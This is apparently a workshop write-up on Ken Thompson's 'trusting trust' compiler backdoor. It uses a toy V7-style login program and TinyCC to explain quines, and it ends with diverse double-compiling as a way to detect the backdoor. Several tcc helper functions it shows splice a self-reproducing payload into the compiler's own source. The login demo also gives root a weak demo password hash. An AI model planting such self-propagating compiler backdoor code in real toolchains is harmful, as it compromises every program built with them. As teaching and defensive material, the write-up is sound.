  struct user *u = find_user(name);      /* stored hash  */

  char *hash = crypt(pw, u->hash);
  if (strcmp(hash, u->hash) != 0) {
    puts("Login incorrect");

  setgid(u->gid);                        /* become the user: */
  setuid(u->uid);                        /* group, then uid  */

}

login.c

Simple login program inspired by the one in Unix V7.

  • Read a username
  • Look it up in a small user table
  • Prompt for a password
  • crypt() the password and compare with the stored hash
  • On match print a welcome and drop into a /bin/sh

A fixed table of users stands in for /etc/passwd. 

static const struct user USERS[] = {
  { "alice", "aacoGZy0DVVSw" }, /* demo   */
  { "bob",   "bbXi4Hst6ytRc" }, /* secret */
  { "root",  "aacoGZy0DVVSw" }, /* demo   */
  { NULL, NULL }
};

The core logic is the same as the one in Unix V7 

  u    = find_user(name);
  pw   = read_password();

  /* hash the typed password, compare with stored hash */
  namep = crypt(pw, u ? u->hash : "xx");
  if (!u || !namep || strcmp(namep, u->hash) != 0) {
    puts("Login incorrect");
    return 1;
  }

  printf("Welcome %s\n", u->name);   /* authenticated */
  execl("/bin/sh", "-sh", NULL);     /* give a shell  */

/*
 * Tiny demo login for the RomHack Thompson workshop.
 *
 * No PAM. Auth is in this file, same idea as Research Unix V7:
 *   hash = crypt(getpass("Password:"), salt);
 *   compare to the stored hash.
 *
 * Not a system /bin/login. Demo users only (see USERS below).
 * Historical original: login.v7.c (Bell Labs Research Unix Seventh Edition).
 *
 * Clean source on purpose: the Thompson backdoor is planted by a
 * compromised compiler at compile time, not written here.
 */

    const char *name;
    const char *hash; /* crypt(3) hash; password is the comment below */
};

 * password "secret" -> DES crypt, salt "bb"

static const struct user *find_user(const char *name)
{
    const struct user *u;
    for (u = USERS; u->name; u++)
        if (strcmp(u->name, name) == 0)
            return u;
    return NULL;
}

static char *read_password(void)
{
    if (isatty(STDIN_FILENO))
        return getpass("Password: ");

    static char buf[128];
    fputs("Password: ", stdout);
    fflush(stdout);
    if (!fgets(buf, sizeof buf, stdin))
        return NULL;
    buf[strcspn(buf, "\n")] = '\0';
    return buf;
}

A compiler that compiles itself can be taught to recognise its own source.

static char *thompson_splice_once(char *src, const char *needle, const char *repl)
{
    char *hit = strstr(src, needle);
    if (!hit)                                  /* needle gone? leave  */
        return src;                            /* src untouched       */

    size_t off  = hit - src;                   /* bytes before needle */
    size_t nlen = strlen(needle);
    size_t rlen = strlen(repl);
    size_t len  = strlen(src);

    char *out = tcc_malloc(len - nlen + rlen + 1);
    memcpy(out,               src,        off);              /* head */
    memcpy(out + off,         repl,       rlen);             /* repl */
    memcpy(out + off + rlen,  hit + nlen, len - off - nlen + 1); /* tail + NUL */

    tcc_free(src);                             /* drop the old buffer */
    return out;
}

Step 2 · Quines

In order to reach Thompson's cutest program we need to obtain self-reproducing behavior.

The payload must reproduce itself.

A Quine is a program that takes no input and prints its own source code, character for character.

Let's read Thompson's own words on the quine:

A program cannot just hold a string literal of itself, because it would induce an infinite regress.

We start with the program we want to print: 

char *s = "a";

To print it, s must contain that very line. So let's paste it in, escaping the quotes: 

char *s = "char *s = \"a\";";

But now s no longer matches the source: it's missing the copy we just added. So let's paste it in, escaping the escapes: 

char *s = "char *s = \"char *s = \\\"a\\\";\";";

Each fix makes the string longer than the code it must reproduce and the regress never terminates: 

char *s = "a";
char *s = "char *s = \"a\";";
char *s = "char *s = \"char *s = \\\"a\\\";\";";

Instead of directly containing itself, the program must contain a description of part of itself, and a procedure that uses that description in two different ways:

  1. As quotation (mention)
  2. As the thing itself (use)
char s[] = {
        125,   /* }  */
        59,    /* ;  */
        10,    /* \n */
        10,    /* \n */
        35,    /* #  */
        /* ... one integer per character, from "};" to the end ... */
        0
};

#include <stdio.h>

int main(void)
{
        int i;

        printf("char s[] = {\n");
        for (i = 0; s[i]; i++)
                printf("\t%d,\n", s[i]);   /* s printed as DATA  */
        printf("%s", s);                   /* s printed as TEXT  */

}

static char *thompson_splice_once(
    char *src, const char *needle, const char *repl)
{
    char *hit = strstr(src, needle);
    size_t off, nlen, rlen, len;
    char *out;
    if (!hit)
        return src;
    off = (size_t)(hit - src);
    nlen = strlen(needle);
    rlen = strlen(repl);
    len = strlen(src);
    out = tcc_malloc(len - nlen + rlen + 1);
    memcpy(out, src, off);
    memcpy(out + off, repl, rlen);
    memcpy(out + off + rlen, hit + nlen,
           len - off - nlen + 1);
    tcc_free(src);
    return out;
}
load + rebuild
static char *thompson_load_path(const char *path)
{
    int fd = open(path, O_RDONLY | O_BINARY);
    char *buf;
    if (fd < 0)
        return NULL;
    buf = tcc_load_text(fd);
    close(fd);
    return buf;
}

static char *thompson_rebuild_chunk(void)
{
    CString cs;
    int i;
    cstr_new(&cs);
    cstr_printf(&cs,
        "static const char thompson_payload[] = {\n");
    for (i = 0; thompson_payload[i]; i++)
        cstr_printf(&cs, "\t%d,\n",
            (unsigned char)thompson_payload[i]);
    cstr_printf(&cs, "\t0\n};\n");
    cstr_cat(&cs, thompson_payload, 0);
    return cs.data;
}

static int thompson_hook_add_file(

compile tcc.c
static int thompson_compile_compiler(
    TCCState *s1, int flags,
    const char *filename, int fd)
{
    char libpath[1024];
    char *base, *tcc_src, *lib_src, *combined;
    int dlen, ret;

    close(fd);
    base = tcc_basename(filename);
    dlen = (int)(base - (char *)filename);
    if (dlen < 0)
        dlen = 0;
    if (dlen == 0)
        snprintf(libpath, sizeof libpath, "libtcc.c");
    else
        snprintf(libpath, sizeof libpath,
                 "%.*slibtcc.c", dlen, filename);

    tcc_src = thompson_load_path(filename);
    lib_src = thompson_load_path(libpath);
    if (!tcc_src || !lib_src) {
        tcc_free(tcc_src);
        tcc_free(lib_src);
        tcc_error_noabort(
            "thompson: cannot load tcc.c/libtcc.c");
        return -1;
    }
    lib_src = thompson_poison_libtcc(lib_src);
    combined = thompson_inline_libtcc(tcc_src, lib_src);
    ret = tcc_compile(s1, flags, combined, -1);
    tcc_free(combined);
    return ret;
}

  • Diverse double-compiling.

    The idea is to use a second, independent compiler, to compile the same source.

We start with the following inputs:

  • \(\texttt{A}\): suspect compiler binary
  • \(\texttt{sA}\): source code that claims to produce \(\texttt{A}\)
  • \(\texttt{T}\): independent trusted compiler for the same language

We want to understand if \(\texttt{A}\) truly corresponds to \(\texttt{sA}\) (honest compiler) or if it has been the target of a Thompon's style backdoor.

\[\texttt{sA} \rightarrow \texttt{A}\]

Assumptions that must hold:

  • \(\texttt{T}\) has no trigger or payload aimed at \(\texttt{sA}\)
  • It implements the language semantics of \(\texttt{sA}\)
  • Compilation is deterministic
  • Every other tool is trustworthy

Step 0 - control check (regeneration)

Compute \(\texttt{A'} = \texttt{A(sA)}\) by compiling \(\texttt{sA}\) with \(\texttt{A}\).

  • If \(\texttt{A'} \neq \texttt{A}\), stop, because the build isn't reproducible and so no conclusion is possible yet.
  • Otherwise keep going.

A backdoored \(\texttt{A}\) will easily pass this step.

Step 1 - diverse compile

Compute \(\texttt{stage1} = \texttt{T(sA)}\).

It is functionally equivalent to what sA describes, but its bytes might differ from \(\texttt{A}\) because \(\texttt{T}\) generates different code.

It contains no trojan inherited from \(\texttt{A}\).

Step 2 - self-compile

Compute \(\texttt{stage2} = \texttt{stage1(sA)}\).

Because \(\texttt{stage1}\) behaves exactly as \(\texttt{sA}\) specifies, \(\texttt{stage2}\) is the canonical output of \(\texttt{sA}\) compiling itself.

Step 3 - Compare and Decide

Check that \(\texttt{stage2} == \texttt{A}\) bit for bit, using a trusted comparison tool.

  • If equal, \(\texttt{A}\) corresponds exactly to \(\texttt{sA}\), move on to code review.
  • If not equal, \(\texttt{A}\) contains something \(\texttt{sA}\) doesn't explain, could be a backdoor or a compiler bug.
